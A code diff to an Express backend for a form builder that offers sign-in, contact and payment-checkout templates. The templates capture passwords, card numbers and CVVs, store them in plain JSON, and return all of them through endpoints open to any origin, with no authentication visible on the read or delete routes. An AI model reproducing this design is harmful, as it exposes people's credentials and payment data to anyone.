@@ -74,7 +74,7 @@ let formConfigs = {};
 
 // Middleware - Updated CORS configuration
 app.use(cors({
-  origin: ['http://localhost:3000', 'https://plexzora.onrender.com', '*'],
+  origin: ['http://localhost:3000', 'https://plexzora.onrender.com', 'https://your-frontend-domain.com'],
   methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
   allowedHeaders: ['Content-Type', 'Accept', 'Authorization'],
   credentials: false
@@ -506,21 +506,39 @@ function sanitizeForJs(str) {
 // Route to return submissions and form configurations as JSON
 app.get('/get', async (req, res) => {
   try {
-    // Add explicit CORS headers
     res.header('Access-Control-Allow-Origin', '*');
     res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
     res.header('Access-Control-Allow-Headers', 'Content-Type, Accept, Authorization');
     
     const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
     const templates = {
-      'sign-in': { name: 'Sign In Form', fields: [{ id: 'email' }, { id: 'password' }] },
-      'contact': { name: 'Contact Form', fields: [{ id: 'phone' }, { id: 'email' }] },
-      'payment-checkout': { name: 'Payment Checkout Form', fields: [{ id: 'card-number' }, { id: 'exp-date' }, { id: 'cvv' }] }
+      'sign-in': {
+        name: 'Sign In Form',
+        fields: [
+          { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } },
+          { id: 'password', placeholder: 'Password', type: 'password', validation: { required: true } }
+        ]
+      },
+      'contact': {
+        name: 'Contact Form',
+        fields: [
+          { id: 'phone', placeholder: 'Phone Number', type: 'tel', validation: { required: true } },
+          { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } }
+        ]
+      },
+      'payment-checkout': {
+        name: 'Payment Checkout Form',
+        fields: [
+          { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: true, regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
+          { id: 'exp-date', placeholder: 'Expiration Date (MM/YY)', type: 'text', validation: { required: true } },
+          { id: 'cvv', placeholder: 'CVV', type: 'text', validation: { required: true } }
+        ]
+      }
     };
     console.log(`Retrieved ${submissions.length} submissions for /get`);
     res.json({
       submissions: submissions.reverse(),
-      formConfigs, // Include form configurations
+      formConfigs,
       templates
     });
   } catch (error) {
@@ -553,7 +571,8 @@ app.post('/create', async (req, res) => {
       buttonAction: validActions.includes(req.body.buttonAction) ? req.body.buttonAction : 'url',
       buttonUrl: req.body.buttonUrl ? normalizeUrl(req.body.buttonUrl) : '',
       buttonMessage: req.body.buttonMessage || '',
-      theme: req.body.theme === 'dark' ? 'dark' : 'light'
+      theme: req.body.theme === 'dark' ? 'dark' : 'light',
+      createdAt: new Date().toISOString()
     };
 
     if (config.buttonAction === 'url' && config.buttonUrl && !normalizeUrl(config.buttonUrl)) {
@@ -589,12 +608,46 @@ app.post('/form/:id/submit', async (req, res) => {
 
   try {
     const formData = req.body;
+    const config = formConfigs[formId];
+    const templates = {
+      'sign-in': {
+        name: 'Sign In Form',
+        fields: [
+          { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } },
+          { id: 'password', placeholder: 'Password', type: 'password', validation: { required: true } }
+        ]
+      },
+      'contact': {
+        name: 'Contact Form',
+        fields: [
+          { id: 'phone', placeholder: 'Phone Number', type: 'tel', validation: { required: true } },
+          { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } }
+        ]
+      },
+      'payment-checkout': {
+        name: 'Payment Checkout Form',
+        fields: [
+          { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: true, regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
+          { id: 'exp-date', placeholder: 'Expiration Date (MM/YY)', type: 'text', validation: { required: true } },
+          { id: 'cvv', placeholder: 'CVV', type: 'text', validation: { required: true } }
+        ]
+      }
+    };
+    const template = templates[config.template] || templates['sign-in'];
+
+    // Map submitted data to user-defined placeholders
+    const mappedData = {};
+    Object.entries(formData).forEach(([fieldId, value]) => {
+      const customField = config.placeholders.find(p => p.id === fieldId);
+      const templateField = template.fields.find(f => f.id === fieldId);
+      const displayName = customField?.placeholder || templateField?.placeholder || fieldId;
+      mappedData[sanitizeForJs(displayName)] = sanitizeForJs(value);
+    });
+
     const submission = {
       formId,
       timestamp: new Date().toISOString(),
-      data: Object.fromEntries(
-        Object.entries(formData).map(([key, value]) => [sanitizeForJs(key), sanitizeForJs(value)])
-      )
+      data: mappedData
     };
 
     console.log(`Attempting to save submission for ${formId}:`, submission);
@@ -617,24 +670,18 @@ app.delete('/form/:id/submission/:index', async (req, res) => {
   const index = parseInt(req.params.index, 10);
 
   try {
-    // Add explicit CORS headers
     res.header('Access-Control-Allow-Origin', '*');
     res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
     res.header('Access-Control-Allow-Headers', 'Content-Type, Accept, Authorization');
 
-    // Read submissions
     const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
-
-    // Filter submissions for the given formId
     const formSubmissions = submissions.filter(s => s.formId === formId);
 
-    // Check if index is valid
     if (index < 0 || index >= formSubmissions.length) {
       console.error(`Invalid submission index: ${index} for form ${formId}`);
       return res.status(404).json({ error: 'Submission not found' });
     }
 
-    // Find the global index of the submission to delete
     const globalIndex = submissions.findIndex(
       (s, i) => s.formId === formId && submissions.filter(s2 => s2.formId === formId).indexOf(s) === index
     );
@@ -644,10 +691,7 @@ app.delete('/form/:id/submission/:index', async (req, res) => {
       return res.status(404).json({ error: 'Submission not found' });
     }
 
-    // Remove the submission
     submissions.splice(globalIndex, 1);
-
-    // Save updated submissions
     await fs.writeFile(submissionsFile, JSON.stringify(submissions, null, 2));
     console.log(`Deleted submission at index ${index} for form ${formId}`);
 
@@ -663,27 +707,22 @@ app.delete('/form/:id', async (req, res) => {
   const formId = req.params.id;
 
   try {
-    // Add explicit CORS headers
     res.header('Access-Control-Allow-Origin', '*');
     res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
     res.header('Access-Control-Allow-Headers', 'Content-Type, Accept, Authorization');
 
-    // Check if form exists
     if (!formConfigs[formId]) {
       console.error(`Form not found for ID: ${formId}`);
       return res.status(404).json({ error: 'Form not found' });
     }
 
-    // Delete form from formConfigs
     delete formConfigs[formId];
-    await fs.writeFile(formConfigsFile, JSON.stringify(formConfigs, null, 2));
-    console.log(`Deleted form config for ${formId}`);
+    await saveFormConfigs();
 
-    // Delete associated submissions
     const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
     const updatedSubmissions = submissions.filter(s => s.formId !== formId);
     await fs.writeFile(submissionsFile, JSON.stringify(updatedSubmissions, null, 2));
-    console.log(`Deleted submissions for form ${formId}`);
+    console.log(`Deleted form ${formId} and its submissions`);
 
     res.status(200).json({ message: 'Form and associated submissions deleted successfully' });
   } catch (error) {
@@ -695,21 +734,39 @@ app.delete('/form/:id', async (req, res) => {
 // Route to serve JSON for submissions (for backwards compatibility)
 app.get('/submissions', async (req, res) => {
   try {
-    // Add explicit CORS headers
     res.header('Access-Control-Allow-Origin', '*');
     res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
     res.header('Access-Control-Allow-Headers', 'Content-Type, Accept, Authorization');
     
     const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
     const templates = {
-      'sign-in': { name: 'Sign In Form', fields: [{ id: 'email' }, { id: 'password' }] },
-      'contact': { name: 'Contact Form', fields: [{ id: 'phone' }, { id: 'email' }] },
-      'payment-checkout': { name: 'Payment Checkout Form', fields: [{ id: 'card-number' }, { id: 'exp-date' }, { id: 'cvv' }] }
+      'sign-in': {
+        name: 'Sign In Form',
+        fields: [
+          { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } },
+          { id: 'password', placeholder: 'Password', type: 'password', validation: { required: true } }
+        ]
+      },
+      'contact': {
+        name: 'Contact Form',
+        fields: [
+          { id: 'phone', placeholder: 'Phone Number', type: 'tel', validation: { required: true } },
+          { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } }
+        ]
+      },
+      'payment-checkout': {
+        name: 'Payment Checkout Form',
+        fields: [
+          { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: true, regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
+          { id: 'exp-date', placeholder: 'Expiration Date (MM/YY)', type: 'text', validation: { required: true } },
+          { id: 'cvv', placeholder: 'CVV', type: 'text', validation: { required: true } }
+        ]
+      }
     };
     console.log(`Retrieved ${submissions.length} submissions for /submissions`);
     res.json({
       submissions: submissions.reverse(),
-      formConfigs, // Include formConfigs for consistency
+      formConfigs,
       templates
     });
   } catch (error) {
